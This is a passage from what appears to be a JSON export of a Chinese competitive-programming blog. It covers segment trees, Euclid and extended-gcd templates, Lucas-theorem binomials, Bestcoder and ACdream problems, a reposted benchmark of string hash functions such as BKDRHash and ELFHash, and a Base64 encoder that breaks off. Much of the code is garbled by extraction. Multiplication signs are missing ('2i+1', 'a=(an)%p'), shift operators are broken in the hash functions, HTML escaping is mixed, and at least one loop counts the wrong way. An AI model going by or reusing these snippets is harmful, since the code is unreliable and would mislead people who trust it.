mid; LL v, add, mul; bool up;} SegTree[maxn * 4]; void build(int rt, int l, int r){ SegTree[rt].l = l; SegTree[rt].r = r; SegTree[rt].mid = (l + r) &gt;&gt; 1; SegTree[rt].add = SegTree[rt].v = 0; SegTree[rt].mul = 1; if (l &lt; r) { SegTree[rt].up = 0; build(rt &lt;&lt; 1, l, SegTree[rt].mid); build(rt &lt;&lt; 1 | 1, SegTree[rt].mid + 1, r); } else { SegTree[rt].up = 1; }} void pushdown(int rt){ int mid = SegTree[rt].mid; if (SegTree[rt].up) { SegTree[rt &lt;&lt; 1].add = SegTree[rt &lt;&lt; 1 | 1].add = 0; SegTree[rt &lt;&lt; 1].mul = SegTree[rt &lt;&lt; 1 | 1].mul = 1; SegTree[rt &lt;&lt; 1].v = SegTree[rt &lt;&lt; 1 | 1].v = SegTree[rt].v; SegTree[rt &lt;&lt; 1].up = SegTree[rt &lt;&lt; 1 | 1].up = 1; SegTree[rt].up = 0; } else { if (SegTree[rt].add) { if (SegTree[rt &lt;&lt; 1].up) { SegTree[rt &lt;&lt; 1].v += SegTree[rt].add; SegTree[rt &lt;&lt; 1].v %= mod; } else { pushdown(rt &lt;&lt; 1); SegTree[rt &lt;&lt; 1].add += SegTree[rt].add; SegTree[rt &lt;&lt; 1].add %= mod; } if (SegTree[rt &lt;&lt; 1 | 1].up) { SegTree[rt &lt;&lt; 1 | 1].v += SegTree[rt].add; SegTree[rt &lt;&lt; 1 | 1].v %= mod; } else { pushdown(rt &lt;&lt; 1 | 1); SegTree[rt &lt;&lt; 1 | 1].add += SegTree[rt].add; SegTree[rt &lt;&lt; 1 | 1].add %= mod; } SegTree[rt].add = 0; } if (SegTree[rt].mul != 1) { if (SegTree[rt &lt;&lt; 1].up) { SegTree[rt &lt;&lt; 1].v = SegTree[rt].mul; SegTree[rt &lt;&lt; 1].v %= mod; } else { pushdown(rt &lt;&lt; 1); SegTree[rt &lt;&lt; 1].mul = SegTree[rt].mul; SegTree[rt &lt;&lt; 1].mul %= mod; } if (SegTree[rt &lt;&lt; 1 | 1].up) { SegTree[rt &lt;&lt; 1 | 1].v = SegTree[rt].mul; SegTree[rt &lt;&lt; 1 | 1].v %= mod; } else { pushdown(rt &lt;&lt; 1 | 1); SegTree[rt &lt;&lt; 1 | 1].mul = SegTree[rt].mul; SegTree[rt &lt;&lt; 1 | 1].mul %= mod; } SegTree[rt].mul = 1; } }} void update(int rt, int x, int y, LL num,int op){ int&amp; l = SegTree[rt].l, &amp;r = SegTree[rt].r, &amp;mid = SegTree[rt].mid; //cout&lt;&lt;&quot;+ &quot;&lt;&lt;rt&lt;&lt;’ ‘&lt;&lt;l&lt;&lt;’ ‘&lt;&lt;r&lt;&lt;’ ‘&lt;&lt;mid&lt;&lt;&quot; &quot;&lt;&lt;x&lt;&lt;’ ‘&lt;&lt;y&lt;&lt;’ ‘&lt;&lt;num&lt;&lt;endl; if (x &lt;= SegTree[rt].l &amp;&amp; SegTree[rt].r &lt;= y) { if (op==3) { SegTree[rt].add=0; SegTree[rt].mul=1; SegTree[rt].v=num; SegTree[rt].up=1; } else { if (SegTree[rt].up) { if (op==1) { SegTree[rt].v+=num;SegTree[rt].v%=mod; } else { SegTree[rt].v=num;SegTree[rt].v%=mod; } } else { pushdown(rt); if (op==1) { SegTree[rt].add+=num;SegTree[rt].add%=mod; } else { SegTree[rt].mul=num;SegTree[rt].mul%=mod; } } } return; } pushdown(rt); if (x &lt;= mid) update(rt &lt;&lt; 1, x, min(mid, y), num,op); if (y &gt; mid) update(rt &lt;&lt; 1 | 1, max(mid + 1, x), y, num,op);} LL query(int rt, int x, int y, int p){ int&amp; l = SegTree[rt].l, &amp;r = SegTree[rt].r, &amp;mid = SegTree[rt].mid; //cout&lt;&lt;&quot;q &quot;&lt;&lt;rt&lt;&lt;’ ‘&lt;&lt;l&lt;&lt;’ ‘&lt;&lt;r&lt;&lt;’ ‘&lt;&lt;mid&lt;&lt;&quot; &quot;&lt;&lt;SegTree[rt].v&lt;&lt;’ ‘&lt;&lt;SegTree[rt].add&lt;&lt;’ ‘&lt;&lt;SegTree[rt].mul&lt;&lt;endl; //&lt;&lt;&quot; &quot;&lt;&lt;x&lt;&lt;’ ‘&lt;&lt;y&lt;&lt;’ ‘&lt;&lt;endl; if (x &lt;= SegTree[rt].l &amp;&amp; SegTree[rt].r &lt;= y&amp;&amp;SegTree[rt].up) { LL tmp=LL(r-l+1)%mod; for(int i=1;i&lt;=p;i++) { tmp*=SegTree[rt].v;tmp%=mod; } return tmp; } pushdown(rt); return (((x &lt;= mid) ? query(rt &lt;&lt; 1, x, min(mid, y), p) : 0LL) + ((y &gt; mid) ? query(rt &lt;&lt; 1 | 1, max(mid + 1, x), y, p) : 0LL)) % mod;} LL fnd(int rt, int x){ if (SegTree[rt].l == SegTree[rt].r) { return SegTree[rt].v; } else if (x &lt;= SegTree[rt].mid) { return fnd(rt &lt;&lt; 1, x); } else { return fnd(rt &lt;&lt; 1 | 1, x); }} int main(){ int n, m; while (~scanf(&quot;%d%d&quot;, &amp;n, &amp;m)) { if (!n &amp;&amp; !m) { break; } build(1, 1, n); for (int i = 1; i &lt;= m; i++) { int op, x, y; LL c; scanf(&quot;%d%d%d%I64d&quot;, &amp;op, &amp;x, &amp;y, &amp;c); switch (op) { case 1: case 2: case 3: update(1, x, y, c,op); //query(1,x,y,1); break; case 4: printf(&quot;%I64d\\n&quot;, query(1, x, y, c)); break; } //for(int i=1;i&lt;=n;i++) printf(&quot;%lld &quot;,fnd(1,i));printf(&quot;\\n&quot;); } } return 0;}[/code]","link":"/posts/4f35b530/"},{"title":"PHP Markdown &amp; LaTex test","text":"[code lang=”cpp”][/code]&lt;https: //daringfireball.net/projects/markdown/syntax&gt;The full documentation of Markdown’s syntax |Hash函数|数据1|数据2|数据3|数据4|数据1得分|数据2得分|数据3得分|数据4得分|平均分| |—-|—-|—-|—-|—-|—-|—-|—-|—-|—-| |BKDRHash|2|0|4774|481|96.55|100|90.95|82.05|92.64| |APHash|2|3|4754|493|96.55|88.46|100|51.28|86.28| |DJBHash|2|2|4975|474|96.55|92.31|0|100|83.43| |JSHash|1|4|4761|506|100|84.62|96.83|17.95|81.94| |RSHash|1|0|4861|505|100|100|51.58|20.51|75.96| |SDBMHash|3|2|4849|504|93.1|92.31|57.01|23.08|72.41| |PJWHash|30|26|4878|513|0|0|43.89|0|21.95| |ELFHash|30|26|4878|513|0|0|43.89|0|21.95| Problem DescriptionTom was on the way home from school. He saw a matrix in the sky. He found that if we numbered rows and columns of the matrix from 0, then, $latex {a} _ {i,j}={C} _ {i}^{j}$if i &lt; j, $latex {a}_{i,j}=0$Tom suddenly had an idea. He wanted to know the sum of the numbers in some rectangles. Tom needed to go home quickly, so he wouldn’t solve this problem by himself. Now he wants you to help him.Because the number may be very large, output the answer to the problem modulo a prime p. InputMulti test cases(about 8). Each case occupies only one line, contains five integers, $latex x_{1}、y_{1}、x_{2}、y_{2}、p.x_{1}\\leq x_{2}\\leq {10}^{5},y_{1}\\leq y_{2}\\leq {10}^{5},2\\leq p\\leq {10}^{9}$ . ###Latex公式测试行内公式 $ \\delta = \\beta / (\\alpha + 1) $行间公式$$\\frac{O}{I} \\approx \\frac{A}{1+AF}$$ $$ 上下标 U_o = A^2 ( U_+ - U_- ) $$ $$ 上下标 (U_o = A^2 ( U_+ - U_- )) $$ $$ 上下标 [U_o = A^2 * ( U_+ - U_- )] $$ 积分 $latex \\int_1 ^2 sin x dx $ 方程组$$\\begin{aligned}\\dot{x} &amp; = \\sigma(y-x) \\newline\\dot{y} &amp; = \\rho x - y - xz \\newline\\dot{z} &amp; = -\\beta z + xy\\end{aligned}$$ $$\\begin{eqnarray}&amp;&amp; \\frac{\\partial x}{\\partial C_{ikj}} \\&amp;&amp; \\frac{\\partial C_{ikj}}{\\partial R_{ik}} \\&amp;&amp; \\frac{\\partial C_{ikj}}{\\partial R_{jk}}\\&amp;&amp; a = R_{ik}^2-R_{jk}^2 , b = (R_{ij}^4-a^2)^2\\end{eqnarray}$$ $$\\left{ \\Sigma= { (\\theta,\\varphi)|0\\le \\theta \\le 2\\pi,0\\le \\varphi \\le\\frac{\\pi}{2} \\right}$$ &lt;/https:&gt;","link":"/posts/c572affa/"},{"title":"【模板】各种欧几里得","text":"原文地址[code lang=”cpp”]int gcd(int n,int m)//n&gt;m{ //最大公约数 int r; while(m) { r = n%m; n = m; m = r; } return n;} int kgcd(int a,int b){ if(!a) return b; if(!b) return a; if(!(a&amp;1) &amp;&amp; !(b&amp;1)) return kgcd(a&gt;&gt;1,b&gt;&gt;1)&lt;&lt;1; else if(!(b&amp;1)) return kgcd(a,b&gt;&gt;1); else if(!(a&amp;1)) return kgcd(a&gt;&gt;1,b); else return kgcd(abs(a-b),min(a,b));} //扩展欧几里得//求方程ax+by+c = 0有多少整数解int extgcd(int a,int b,int &amp;x,int &amp;y){ if(!b) { x=1; y=0; return a; } int d = extgcd(b,a%b,x,y); int t = x; x=y; y=t-a/b*y; return d;}[/code]","link":"/posts/319c19f0/"},{"title":"【HDU 3037】大数组合取模之Lucas定理","text":"原文地址[code lang=”cpp”] #include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;algorithm&gt; #include &lt;cmath&gt; #include &lt;cstring&gt;using namespace std; typedef long long lld;lld n, m, p; lld Ext_gcd(lld a,lld b,lld &amp;x,lld &amp;y){ if(b==0) { x=1, y=0; return a; } lld ret= Ext_gcd(b,a%b,y,x); y-= a/b*x; return ret;}lld Inv(lld a,int m){ ///求逆元 lld d,x,y,t= (lld)m; d= Ext_gcd(a,t,x,y); if(d==1) return (x%t+t)%t; return -1;} lld Cm(lld n, lld m, lld p) ///组合数学{ lld a=1, b=1; if(m&gt;n) return 0; while(m) { a=(an)%p; b=(bm)%p; m–; n–; } return (lld)aInv(b,p)%p; ///（a/b）%p 等价于 a（b，p）的逆元} int Lucas(lld n, lld m, lld p) ///把n分段递归求解相乘{ if(m==0) return 1; return (lld)Cm(n%p,m%p,p)*(lld)Lucas(n/p,m/p,p)%p;} int main(){ int T; cin &gt;&gt; T; while(T–) { scanf(&quot;%lld%lld%lld&quot;,&amp;n,&amp;m,&amp;p); printf(&quot;%d\\n&quot;,Lucas(n+m,m,p)); } return 0;}[/code]","link":"/posts/5a902148/"},{"title":"Bestcoder","text":"Tom and paperTime Limit: 2000/1000 MS (Java/Others)Memory Limit: 65536/65536 K (Java/Others) Problem DescriptionThere is a piece of paper in front of Tom, its length and width are integer. Tom knows the area of this paper, he wants to know the minimum perimeter of this paper. InputIn the first line, there is an integer T indicates the number of test cases. In the next T lines, there is only one integer n in every line, indicates the area of paper. $latex T\\leq 10,n\\leq {10}^{9} $ OutputFor each case, output a integer, indicates the answer. Sample Input32712 Sample Output61614 暴力枚举啊，怎么刚开赛那会儿就想不通了？[code lang=”cpp”]int main(){ int T; scanf(&quot;%d&quot;, &amp;T); while (T–) {int n; scanf(&amp;quot;%d&amp;quot;, &amp;amp;n); int i, a, b; if (n &amp;gt; 1) for (i = (int)sqrt(n); i &amp;gt; 0; i++) { a = i; b = n / a; if (a * b == n) { break; } } else { a = 1; b = n / a; }; //cout&amp;lt;&amp;lt;a&amp;lt;&amp;lt;&apos; &apos;&amp;lt;&amp;lt;b&amp;lt;&amp;lt;endl; printf(&amp;quot;%d\\n&amp;quot;, 2 * a + 2 * b); } return 0;}[/code] Tom and permutationTime Limit: 2000/1000 MS (Java/Others)Memory Limit: 65536/65536 K (Java/Others) Problem Description Tom has learned how to calculate the number of inversions in a permutation of n distinct objects by coding, his teacher gives him a problem:Give you a permutation of n distinct integer from 1 to n, there are many permutations of 1-n is smaller than the given permutation on dictionary order, and for each of them, you can calculate the number of inversions by coding. You need to find out sum total of them.Tom doesn’t know how to do, he wants you to help him.Because the number may be very large, output the answer to the problem modulo $latex {10}^{9}+{7} $ . Input Multi test cases(about 20). For each case, the first line contains a positive integer n, the second line contains n integers, it’s a permutation of 1-n. $latex n\\leq 100 $ Output For each case, print one line, the answer to the problem modulo $latex {10}^{9}+7 $ . Sample Input 32 1 352 1 4 3 5 Sample Output 175 Hint The input may be very big, we might as well optimize input. [code lang=”cpp”] #include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string&gt; #include &lt;string.h&gt; #include &lt;algorithm&gt; #include &lt;vector&gt; #include &lt;map&gt; #include &lt;set&gt; #include &lt;stdlib.h&gt; #include &lt;queue&gt; #include &lt;math.h&gt; #pragma comment(linker, &quot;/STACK:102400000,102400000&quot;) using namespace std ; typedef long long LL ; int a[108] ;LL dp[108] , fac[108] ;LL big[108] , les[108] , eb[108] ;LL N[108] ; const LL mod = 1000000007LL ; int main(){ fac[0] = 1LL ; for(LL i = 1 ; i &amp;lt;= 100 ; i++){ fac[i] = fac[i-1] * i % mod ; } dp[1] = 0LL ; for(LL i = 2 ; i &amp;lt;= 100 ; i++){ dp[i] = i * dp[i-1] % mod + i*(i-1)/2 * fac[i-1] % mod ; } /* for(int i = 1 ; i &lt;= 100 ; i++){ cout&lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt;dp[i]&lt;&lt;endl ; } /* int n ; while(cin&gt;&gt;n){ for(int i = 0 ; i &lt; n ; i++) a[i] = i ; int s = 0 ; do{ for(int i = 0 ; i &amp;lt; n ; i++){ for(int j = i+1 ; j &amp;lt; n ; j++){ if(a[i] &amp;gt; a[j]) s++ ; } } }while(next_permutation(a , a+n)) ; cout&amp;lt;&amp;lt; n&amp;lt;&amp;lt;&amp;quot; : &amp;quot; &amp;lt;&amp;lt; s &amp;lt;&amp;lt; endl ; } */ int n ;while(scanf(&quot;%d&quot; , &amp;n) != EOF){ for(int i = 1 ; i &amp;lt;= n ; i++) scanf(&amp;quot;%d&amp;quot; , &amp;amp;a[i]) ; memset(N , 0 , sizeof(N)) ; for(int i = 1 ; i &amp;lt;= n ; i++){ LL s = 0 ; for(int j = 1 ; j &amp;lt; i ; j++){ if(a[j] &amp;gt; a[i]) s++ ; } N[i] = N[i-1] + s ; } for(int i = 1 ; i &amp;lt;= n ; i++){ big[i] = les[i] = 0LL ; for(int j = 1 ; j &amp;lt; i ; j++){ if(a[j] &amp;gt; a[i]) big[i]++ ; } for(int j = i+1 ; j &amp;lt;= n ; j++){ if(a[j] &amp;lt; a[i]) les[i]++ ; } } memset(eb , 0 , sizeof(eb)) ; for(int k = 1 ; k &amp;lt;= n ; k++){ for(int i = 1 ; i &amp;lt; k ; i++){ for(int j = k ; j &amp;lt;= n ; j++){ if(a[i] &amp;gt; a[j]) eb[k]++ ; } } } LL sum = 0 ; for(int i = 1 ; i &amp;lt;= n ; i++){ sum += (eb[i] + N[i-1])*(les[i] * fac[n-i] )% mod ; sum %= mod ; sum += fac[n-i] * (les[i] * (les[i]-1) / 2) % mod ; sum %= mod ; sum += dp[n-i] * les[i] % mod ; sum %= mod ; } cout&amp;lt;&amp;lt; sum &amp;lt;&amp;lt; endl ; } return 0 ; }[/code] Tom and matrixTime Limit: 3000/1500 MS (Java/Others)Memory Limit: 65536/65536 K (Java/Others) Problem DescriptionTom was on the way home from school. He saw a matrix in the sky. He found that if we numbered rows and columns of the matrix from 0, then, $latex {a} _ {i,j}={C} _ {i}^{j}$if i &lt; j, $latex {a}_{i,j}=0$Tom suddenly had an idea. He wanted to know the sum of the numbers in some rectangles. Tom needed to go home quickly, so he wouldn’t solve this problem by himself. Now he wants you to help him.Because the number may be very large, output the answer to the problem modulo a prime p. InputMulti test cases(about 8). Each case occupies only one line, contains five integers, $latex x_{1}、y_{1}、x_{2}、y_{2}、p.x_{1}\\leq x_{2}\\leq {10}^{5},y_{1}\\leq y_{2}\\leq {10}^{5},2\\leq p\\leq {10}^{9}$ . OutputFor each case, print one line, the answer to the problem modulo p. Sample Input0 0 1 1 71 1 2 2 131 0 2 1 2 Sample Output341 [code lang=”cpp”] [/code]","link":"/posts/97dd1257/"},{"title":"ACdreamOJ 1726 hash 二进制表示下的枚举","text":"http://acdream.info/problem?pid=1726 Problem DescriptionRecently, Losanto find an interesting Math game. The rule is simple: Tell you a number H, and you can choose some numbers from a set {a[1],a[2],……,a[n]}.If the sum of the number you choose is H, then you win. Losanto just want to know whether he can win the game. InputThere are several cases.In each case, there are two numbers in the first line n (the size of the set) and H. The second line has n numbers {a[1],a[2],……,a[n]}.0&lt;n&lt;=40, 0&lt;=H&lt;10^9, 0&lt;=a[i]&lt;10^9,All the numbers are integers. OutputIf Losanto could win the game, output “Yes” in a line. Else output “No” in a line. Sample Input10 872 3 4 5 7 9 10 11 12 1310 382 3 4 5 7 9 10 11 12 13 Sample OutputNoYes 最大的n值为40，需枚举的状态略多；于是折成两半枚举。前后两段合拼时，不是正向地求和，而是逆向查询，节约了时间 [code lang=”java”]/** 2015年7月17日 下午5:41:50 PrjName:acd1726 @ Semprathlon*/import java.io.;import java.util.*;public class Main { public static void main(String[] args) throws IOException {StreamTokenizer cin = new StreamTokenizer(new InputStreamReader(System.in)); PrintWriter out = new PrintWriter(System.out); HashSet&amp;lt;Long&amp;gt; map = new HashSet&amp;lt;Long&amp;gt;(); while (cin.nextToken() != StreamTokenizer.TT_EOF) { int n = (int) cin.nval; cin.nextToken(); int m = (int) cin.nval; map.clear(); int[] num = new int[n]; for (int i = 0; i &amp;lt; n; i++) { cin.nextToken(); num[i] = (int) cin.nval; } int t = (n + 1) / 2; for (int i = 0; i &amp;lt; (1 &amp;lt;&amp;lt; t); i++) { long sum = 0; for (int j = 0; j &amp;lt; t; j++) { if ((i &amp;amp; (1 &amp;lt;&amp;lt; j)) &amp;gt; 0) sum += num[j]; } if (sum &amp;gt; m) continue; map.add(sum); } int tt = n - t; boolean flag = map.contains(m); for (int i = 0; i &amp;lt; (1 &amp;lt;&amp;lt; tt); i++) { long sum = 0; for (int j = 0; j &amp;lt; tt; j++) { if ((i &amp;amp; (1 &amp;lt;&amp;lt; j)) &amp;gt; 0) sum += num[t + j]; } if (sum &amp;gt; m) continue; if (map.contains(m - sum)) { flag = true; break; } } if (flag) out.println(&amp;quot;Yes&amp;quot;); else out.println(&amp;quot;No&amp;quot;); // out.flush(); } out.flush(); }}[/code]","link":"/posts/e2070e83/"},{"title":"ACM-ICPC Regionals 2013 &gt;&gt; Asia - Aizu - Count the Regions","text":"Hash处理，多水 [code lang=”cpp”]const int maxn=210;//这里因为错写成110而RE了一次const int inf=99999999;const double eps=1e-3; vector&lt;int&gt; vx,vy;map&lt;int,int&gt; hx,hy;bool vis[maxn][maxn]; struct Poly{ int x1,y1,x2,y2;} Pl[maxn]; void dfs(int n,int x,int y){ if (x&lt;0||y&lt;0||x&gt;n||y&gt;n) return ; if (!vis[x][ y ]) { vis[x][ y ]=1; dfs(n,x-1,y); dfs(n,x+1,y); dfs(n,x,y-1); dfs(n,x,y+1); }} int main(){ int n=1; while(~scanf(&quot;%d&quot;,&amp;n)) { if (!n) break; vx.clear();vy.clear(); hx.clear();hy.clear(); for(int i=1;i&lt;=n;i++) { scanf(&quot;%d%d%d%d&quot;,&amp;Pl[i].x1,&amp;Pl[i].y1,&amp;Pl[i].x2,&amp;Pl[i].y2); vx.push_back(Pl[i].x1);vx.push_back(Pl[i].x2); vy.push_back(Pl[i].y1);vy.push_back(Pl[i].y2); } sort(vx.begin(),vx.end()); sort(vy.begin(),vy.end()); //cout&lt;&lt;vx.size()&lt;&lt;’ ‘&lt;&lt;vy.size()&lt;&lt;endl; for(int i=0;i&lt;vx.size();i++) hx[vx[i]]=2i+1; for(int i=0;i&lt;vy.size();i++) hy[vy[i]]=2i+1;//cout&lt;&lt;&quot;–&quot;&lt;&lt;endl; CLEAR(vis); for(int i=1;i&lt;=n;i++) { int x1=hx[Pl[i].x1]; int x2=hx[Pl[i].x2]; if (x1&gt;x2) swap(x1,x2); int y1=hy[Pl[i].y1]; int y2=hy[Pl[i].y2]; if (y1&gt;y2) swap(y1,y2); //cout&lt;&lt;hx[Pl[i].x1]&lt;&lt;’ ‘&lt;&lt;hy[Pl[i].y1]&lt;&lt;’ ‘&lt;&lt;hx[Pl[i].x2]&lt;&lt;’ ‘&lt;&lt;hy[Pl[i].y2]&lt;&lt;endl; for(int j=x1;j&lt;=x2;j++) vis[j][y1]=vis[j][y2]=1; for(int j=y1;j&lt;=y2;j++) vis[x1][j]=vis[x2][j]=1; } int ans=0; for(int i=0;i&lt;=4n;i++) { //for(int j=0;j&lt;=4n;j++)cout&lt;&lt;vis[i][j]&lt;&lt;’ ‘;cout&lt;&lt;endl; for(int j=0;j&lt;=4n;j++) if (!vis[i][j]) { ans++; dfs(4n,i,j); } } cout&lt;&lt;ans&lt;&lt;endl; } return 0;}[/code]","link":"/posts/7e9f5ed2/"},{"title":"【转】vs2013 图片背景·全透明背景图","text":"原文地址当时我也在研究同样的内容，可是只做到了改变代码窗口的背景（有人在我之前已实现了此功能，还打包成了插件）KyuuBackground","link":"/posts/55f50a82/"},{"title":"【转载】各种字符串Hash函数比较 auth byvoid","text":"转自byvoid大神的博客 常用的字符串Hash函数还有ELFHash，APHash等等，都是十分简单有效的方法。这些函数使用位运算使得每一个字符都对最后的函数值产生影响。另外还有以MD5和SHA1为代表的杂凑函数，这些函数几乎不可能找到碰撞。 常用字符串哈希函数有BKDRHash，APHash，DJBHash，JSHash，RSHash，SDBMHash，PJWHash，ELFHash等等。对于以上几种哈希函数，我对其进行了一个小小的评测。 Hash函数 数据1 数据2 数据3 数据4 数据1得分 数据2得分 数据3得分 数据4得分 平均分 BKDRHash 2 0 4774 481 96.55 100 90.95 82.05 92.64 APHash 2 3 4754 493 96.55 88.46 100 51.28 86.28 DJBHash 2 2 4975 474 96.55 92.31 0 100 83.43 JSHash 1 4 4761 506 100 84.62 96.83 17.95 81.94 RSHash 1 0 4861 505 100 100 51.58 20.51 75.96 SDBMHash 3 2 4849 504 93.1 92.31 57.01 23.08 72.41 PJWHash 30 26 4878 513 0 0 43.89 0 21.95 ELFHash 30 26 4878 513 0 0 43.89 0 21.95 其中数据1为100000个字母和数字组成的随机串哈希冲突个数。数据2为100000个有意义的英文句子哈希冲突个数。数据3为数据1的哈希值与1000003(大素数)求模后存储到线性表中冲突的个数。数据4为数据1的哈希值与10000019(更大素数)求模后存储到线性表中冲突的个数。 经过比较，得出以上平均得分。平均数为平方平均数。可以发现，BKDRHash无论是在实际效果还是编码实现中，效果都是最突出的。APHash也是较为优秀的算法。DJBHash,JSHash,RSHash与SDBMHash各有千秋。PJWHash与ELFHash效果最差，但得分相似，其算法本质是相似的。 在信息修竞赛中，要本着易于编码调试的原则，个人认为BKDRHash是最适合记忆和使用的。 BYVoid原创，欢迎建议、交流、批评和指正。 附：各种哈希函数的C语言程序代码 unsigned int SDBMHash(char *str) { unsigned int hash = 0; while (*str) { // equivalent to: hash = 65599*hash + (*str++); hash = (*str++) + (hash < < 6) + (hash < 16) - hash; } return (hash & 0x7FFFFFFF); } // RS Hash Function unsigned int RSHash(char *str) { unsigned int b = 378551; unsigned int a = 63689; unsigned int hash = 0; while (*str) { hash = hash * a + (*str++); a *= b; } return (hash & 0x7FFFFFFF); } // JS Hash Function unsigned int JSHash(char *str) { unsigned int hash = 1315423911; while (*str) { hash ^= ((hash < 5) + (*str++) + (hash >> 2)); } return (hash & 0x7FFFFFFF); } // P. J. Weinberger Hash Function unsigned int PJWHash(char *str) { unsigned int BitsInUnignedInt = (unsigned int)(sizeof(unsigned int) * 8); unsigned int ThreeQuarters = (unsigned int)((BitsInUnignedInt * 3) / 4); unsigned int OneEighth = (unsigned int)(BitsInUnignedInt / 8); unsigned int HighBits = (unsigned int)(0xFFFFFFFF) < < (BitsInUnignedInt - OneEighth); unsigned int hash = 0; unsigned int test = 0; while (*str) { hash = (hash < OneEighth) + (*str++); if ((test = hash & HighBits) != 0) { hash = ((hash ^ (test >> ThreeQuarters)) & (~HighBits)); } } return (hash & 0x7FFFFFFF); } // ELF Hash Function unsigned int ELFHash(char *str) { unsigned int hash = 0; unsigned int x = 0; while (*str) { hash = (hash < < 4) + (*str++); if ((x = hash & 0xF0000000L) != 0) { hash ^= (x >> 24); hash &= ~x; } } return (hash & 0x7FFFFFFF); } // BKDR Hash Function unsigned int BKDRHash(char *str) { unsigned int seed = 131; // 31 131 1313 13131 131313 etc.. unsigned int hash = 0; while (*str) { hash = hash * seed + (*str++); } return (hash & 0x7FFFFFFF); } // DJB Hash Function unsigned int DJBHash(char *str) { unsigned int hash = 5381; while (*str) { hash += (hash < < 5) + (*str++); } return (hash & 0x7FFFFFFF); } // AP Hash Function unsigned int APHash(char *str) { unsigned int hash = 0; int i; for (i=0; *str; i++) { if ((i & 1) == 0) { hash ^= ((hash < 7) ^ (*str++) ^ (hash >> 3)); } else { hash ^= (~((hash < < 11) ^ (*str++) ^ (hash >> 5))); } } return (hash & 0x7FFFFFFF); }","link":"/posts/16c8295f/"},{"title":"hdu 4821 String  hash乱搞","text":"StringTime Limit: 2000/1000 MS (Java/Others) Memory Limit: 32768/32768 K (Java/Others) Problem DescriptionGiven a string S and two integers L and M, we consider a substring of S as “recoverable” if and only if (i) It is of length M*L; (ii) It can be constructed by concatenating M “diversified” substrings of S, where each of these substrings has length L; two strings are considered as “diversified” if they don’t have the same character for every position. Two substrings of S are considered as “different” if they are cut from different part of S. For example, string “aa” has 3 different substrings “aa”, “a” and “a”. Your task is to calculate the number of different “recoverable” substrings of S. InputThe input contains multiple test cases, proceeding to the End of File. The first line of each test case has two space-separated integers M and L. The second ine of each test case has a string S, which consists of only lowercase letters. The length of S is not larger than 10^5, and 1 ≤ M * L ≤ the length of S. OutputFor each test case, output the answer in a single line. Sample Input3 3abcabcbcaabc Sample Output2 Source2013 Asia Regional Changchun 纯粹是寻找一个最佳的hash姿势？而且还要懂得合适的时间优化？真的TLE了好几次，现场赛的难点枚举字串起点不必从头找到尾，因为向后滚的操作涵盖了i&gt;=l以后的字串[code lang=”cpp”] #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;memory.h&gt; #include&lt;string&gt; #include&lt;map&gt; #define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;typedef unsigned long long ULL;const int maxn=1e5+10;const ULL base=29;//prime map&lt;ULL,int&gt; mp; ULL nbase[maxn],ha[maxn];char str[maxn];//string s; void init(){ nbase[0]=1; for(int i=1;i&lt;maxn;i++) nbase[i]=nbase[i-1]*base;} inline ULL Hash(char s,int len,ULL _hash) //按各个后缀hash{ _hash[len]=0; for(int i=len-1;i&gt;=0;i–) _hash[i]=_hash[i+1]*base+s[i]-‘a’;} inline ULL Get(ULL _hash,int pos,int len){ return _hash[pos]-_hash[pos+len]nbase[len];} int main(){ init(); int m,l; while(~scanf(&amp;quot;%d%d&amp;quot;,&amp;amp;m,&amp;amp;l)) { LL ans=0; scanf(&amp;quot;%s&amp;quot;,str); int len=strlen(str); Hash(str,len,ha); for(int i=0;i&amp;lt;=len-m*l&amp;amp;&amp;amp;i&amp;lt;l;i++) //此处不加条件i&amp;lt;l就TLE { mp.clear(); for(int j=i;j&amp;lt;i+m*l;j+=l) { ULL h=Get(ha,j,l); //cout&amp;lt;&amp;lt;h&amp;lt;&amp;lt;&apos;:&apos;&amp;lt;&amp;lt;s.substr(j,l)&amp;lt;&amp;lt;endl; mp[h]++; } if (mp.size()==m) ans++; for(int j=i+m*l;j&amp;lt;=len-l;j+=l) { ULL h=Get(ha,j-m*l,l); //cout&amp;lt;&amp;lt;h&amp;lt;&amp;lt;&apos;:&apos;&amp;lt;&amp;lt;s.substr(j-m*l,l)&amp;lt;&amp;lt;endl; mp[h]--; if (!mp[h]) mp.erase(h); h=Get(ha,j,l); //cout&amp;lt;&amp;lt;h&amp;lt;&amp;lt;&apos;:&apos;&amp;lt;&amp;lt;s.substr(j,l)&amp;lt;&amp;lt;endl; mp[h]++; if (mp.size()==m) ans++; } } printf(&amp;quot;%I64d\\n&amp;quot;,ans); } return 0; }[/code]","link":"/posts/c02f2f9/"},{"title":"2015 ACM-ICPC 上海大都会赛简要总结","text":"别看一个ACMer在线上有多神通广大，到了现场赛变得多憋屈。去了现场赛一定能学到很多实验室里体验不到的教训。 热身赛二分图匹配用在棋盘覆盖上，省时省力！容斥原理的变式应用，贪心；抓住了一些要点，但处理手段欠缺点 正式赛卡题时间长字符串模拟，手动实现Base64编码，写不好真是跟自己过不去。概率计算不当，因为缺乏对边界线重叠的考虑；几何分布的概型应用时正确的。","link":"/posts/62c08f32/"},{"title":"2015 ACM-ICPC 上海5 24 现场状态","text":"比赛过程中忘了写chs函数导致无论如何都调试不成[cpp] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #define CLEAR(a,n) memset((a),0,n*sizeof((a)[0])) using namespace std; typedef long long LL;typedef unsigned long long ULL;const int maxn=1010;const int inf=0x7fffffff;const double eps=1e-3; const int m1=0x00fc0000;const int m2=0x0003f000;const int m3=0x00000fc0;const int m4=0x0000003f; char str[maxn]; char chs(char ch){ if (ch&gt;=0&amp;&amp;ch&lt;26) return ch+’A’; else if (ch&gt;=26&amp;&amp;ch&lt;52) return ch-26+’a’; else if (ch&gt;=52&amp;&amp;ch&lt;62) return ch-52+’0’; else if (ch==62) return ‘+’; else if (ch==63) return ‘/‘;} void solve(char str[maxn]){ char s[maxn]={‘\\0’}; int len=strlen(str); int tmp=0; int pos=0; for(int i=0;i&lt;len;i++) { tmp&lt;&lt;=8;tmp+=int(str[i]); if (!((i+1)%3)) { s[pos++]=chs((tmp&amp;m1)&gt;&gt;18); 